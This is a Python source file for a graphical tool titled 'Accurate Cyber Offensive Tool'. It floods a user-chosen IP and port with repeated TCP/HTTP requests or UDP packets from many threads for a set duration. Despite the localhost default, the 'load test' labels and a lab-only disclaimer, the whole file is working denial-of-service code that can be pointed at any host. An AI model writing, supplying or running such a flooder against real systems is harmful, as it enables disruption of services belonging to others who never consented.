import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import time
import socket
import random
from concurrent.futures import ThreadPoolExecutor

class accuratelab:
    def __init__(self, root):
        self.root = root
        self.root.title("Accurate Cyber Offensive Tool")
        self.root.geometry("800x600")
        self.root.configure(bg='sky blue')
        
        # Control variable for stopping threads
        self.is_attacking = False
        self.thread_pool = ThreadPoolExecutor(max_workers=100)  # Limited threads

        # Create GUI
        self.setup_gui()

    def setup_gui(self):
        # Main Frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        main_frame.configure(style='Blue.TFrame')

        # Styles
        style = ttk.Style()
        style.configure('Blue.TFrame', background='sky blue')
        style.configure('TButton', background='light blue')
        style.configure('TLabel', background='sky blue', foreground='navy')
        style.configure('TCheckbutton', background='sky blue')

        # Menu Bar (Placeholder)
        menubar = tk.Menu(self.root)
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="Exit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=file_menu)
        menubar.add_cascade(label="View")
        menubar.add_cascade(label="Tools")
        menubar.add_cascade(label="Settings")
        menubar.add_cascade(label="Help")
        self.root.config(menu=menubar)

        # Target Section
        target_label = ttk.Label(main_frame, text="Target Configuration", font=('Arial', 12, 'bold'))
        target_label.grid(row=0, column=0, columnspan=2, pady=5, sticky=tk.W)

        ttk.Label(main_frame, text="Target IP/Hostname:").grid(row=1, column=0, pady=2, sticky=tk.W)
        self.target_ip = ttk.Entry(main_frame, width=30)
        self.target_ip.grid(row=1, column=1, pady=2, sticky=(tk.W, tk.E))
        self.target_ip.insert(0, "127.0.0.1")  # DEFAULT TO LOCALHOST FOR SAFETY

        ttk.Label(main_frame, text="Target Port:").grid(row=2, column=0, pady=2, sticky=tk.W)
        self.target_port = ttk.Entry(main_frame, width=30)
        self.target_port.grid(row=2, column=1, pady=2, sticky=(tk.W, tk.E))
        self.target_port.insert(0, "80")

        # Protocol Selection
        ttk.Label(main_frame, text="Protocol:").grid(row=3, column=0, pady=2, sticky=tk.W)
        self.protocol_var = tk.StringVar(value="TCP")
        protocol_combo = ttk.Combobox(main_frame, textvariable=self.protocol_var, state='readonly', width=27)
        protocol_combo['values'] = ('TCP', 'UDP', 'HTTP')
        protocol_combo.grid(row=3, column=1, pady=2, sticky=tk.W)

        # Attack Parameters
        params_label = ttk.Label(main_frame, text="Load Parameters", font=('Arial', 12, 'bold'))
        params_label.grid(row=4, column=0, columnspan=2, pady=5, sticky=tk.W)

        ttk.Label(main_frame, text="Duration (seconds):").grid(row=5, column=0, pady=2, sticky=tk.W)
        self.duration = ttk.Entry(main_frame, width=30)
        self.duration.grid(row=5, column=1, pady=2, sticky=(tk.W, tk.E))
        self.duration.insert(0, "10")

        ttk.Label(main_frame, text="Threads (Workers):").grid(row=6, column=0, pady=2, sticky=tk.W)
        self.thread_count = ttk.Entry(main_frame, width=30)
        self.thread_count.grid(row=6, column=1, pady=2, sticky=(tk.W, tk.E))
        self.thread_count.insert(0, "50")

        # Control Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=7, column=0, columnspan=2, pady=10)
        button_frame.configure(style='Blue.TFrame')

        self.start_button = ttk.Button(button_frame, text="Start Load Test", command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = ttk.Button(button_frame, text="Stop Load Test", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        # Log Output
        log_label = ttk.Label(main_frame, text="Activity Log", font=('Arial', 12, 'bold'))
        log_label.grid(row=8, column=0, columnspan=2, pady=5, sticky=tk.W)

        self.log = scrolledtext.ScrolledText(main_frame, width=90, height=20, state=tk.DISABLED)
        self.log.grid(row=9, column=0, columnspan=2, pady=5)

        # Disclaimer
        disclaimer_label = ttk.Label(main_frame, text="WARNING: FOR USE IN PRIVATE, ISOLATED LABS ONLY. USE ON ANY NETWORK WITHOUT EXPLICIT PERMISSION IS ILLEGAL.", foreground="red", background='sky blue', font=('Arial', 8, 'bold'))
        disclaimer_label.grid(row=10, column=0, columnspan=2, pady=5)

    def log_message(self, message):
        """Add a message to the log widget."""
        self.log.config(state=tk.NORMAL)
        self.log.insert(tk.END, message + "\n")
        self.log.see(tk.END)
        self.log.config(state=tk.DISABLED)

    def send_tcp_packet(self):
        """Function to send a single TCP packet to the target."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            target = (self.target_ip.get(), int(self.target_port.get()))
            s.connect(target)
            s.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % target[0].encode())
            s.close()
            self.log_message(f"TCP packet sent to {target[0]}:{target[1]}")
        except Exception as e:
            self.log_message(f"Failed to send TCP packet: {e}")

    def send_udp_packet(self):
        """Function to send a single UDP packet to the target."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            target = (self.target_ip.get(), int(self.target_port.get()))
            s.sendto(b"UDP Test Packet", target)
            s.close()
            self.log_message(f"UDP packet sent to {target[0]}:{target[1]}")
        except Exception as e:
            self.log_message(f"Failed to send UDP packet: {e}")

    def attack_worker(self):
        """Worker function that runs in a thread to send packets."""
        protocol = self.protocol_var.get()
        while self.is_attacking:
            if protocol == "TCP":
                self.send_tcp_packet()
            elif protocol == "UDP":
                self.send_udp_packet()
            elif protocol == "HTTP":
                self.send_tcp_packet()  # Reuse TCP for HTTP
            time.sleep(0.01)  # Small delay to avoid completely overwhelming the local machine

    def start_attack(self):
        """Start the load test."""
        # Basic validation
        try:
            target = self.target_ip.get()
            port = int(self.target_port.get())
            dur = int(self.duration.get())
            threads = int(self.thread_count.get())
        except ValueError:
            messagebox.showerror("Error", "Please enter valid numbers for Port, Duration, and Threads.")
            return

        # Safety warning
        if not messagebox.askyesno("Warning", "This will generate significant load on the target and your local machine. Ensure you are in a private lab environment. Proceed?"):
            return

        self.is_attacking = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_message("--- Load Test Started ---")

        # Start the worker threads
        for _ in range(threads):
            self.thread_pool.submit(self.attack_worker)

        # Start a timer to stop the attack after the duration
        threading.Timer(dur, self.stop_attack).start()

    def stop_attack(self):
        """Stop the load test."""
        self.is_attacking = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.log_message("--- Load Test Stopped ---")
        # self.thread_pool.shutdown(wait=False) # Be careful with this

if __name__ == "__main__":
    root = tk.Tk()
    app = accuratelab(root)
    root.mainloop()